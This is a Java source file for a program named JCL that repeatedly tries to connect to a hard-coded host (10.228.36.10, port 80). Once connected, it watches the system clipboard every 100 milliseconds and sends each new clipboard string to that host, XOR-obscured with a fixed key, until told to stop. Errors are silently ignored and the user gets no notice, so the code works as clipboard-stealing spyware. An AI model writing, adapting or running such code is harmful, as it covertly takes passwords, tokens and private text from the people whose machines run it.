/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package jcl;

import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.ByteBuffer;

/**
 *
 * @author Henry
 */
public class JCL {
    
    static final byte TERMINATE_SESSION = 0x01;
    static final byte CLIPBOARD_DATA = 0x02;
    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws IOException {
        Socket echoSocket = null;
        String hostname = "10.228.36.10";
        int port = 80;
        
        while (true) {
            try {
                echoSocket = new Socket(hostname, port);
                break;
            } catch (IOException ex) {
            }
        }
        try {
            OutputStream stream = echoSocket.getOutputStream();
            InputStream inStream = echoSocket.getInputStream();
            
            String lastClipboard = "";
            String newClipboard = "";
            while (true) {
                if (inStream.available() > 0 && inStream.read() == TERMINATE_SESSION) {
                    //echoSocket.close();
                    break;
                }
                try {
                    newClipboard = (String) Toolkit.getDefaultToolkit()
                            .getSystemClipboard().getData(DataFlavor.stringFlavor);
                    if (!newClipboard.equals(lastClipboard)) {
                        lastClipboard = newClipboard;
                        stream.write(CLIPBOARD_DATA);
                        stream.write(ByteBuffer.allocate(4).putInt(lastClipboard.length()).array());
                        stream.write(
                                encrypt(lastClipboard.getBytes()));
                    //System.out.println("sending clipboard");

                    }
                } catch (Exception ex) {
                }
                Thread.sleep(100);
                
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (echoSocket != null)
            echoSocket.close();
        }

    }
    
    public final static byte[] encryptionKey = "thisisatest".getBytes();
    private static int encryptionIndex = 0;
    public static byte encrypt(byte b) {
        encryptionIndex = (encryptionIndex + 1) % encryptionKey.length;
        return (byte) (b ^ encryptionKey[encryptionIndex]);
    }
    
    public static byte[] encrypt(byte[] barr) {
        byte[] result = new byte[barr.length];
         for (int i = 0; i < barr.length; i++) {
             result[i] = encrypt(barr[i]);
         }
         return result;
    }
}
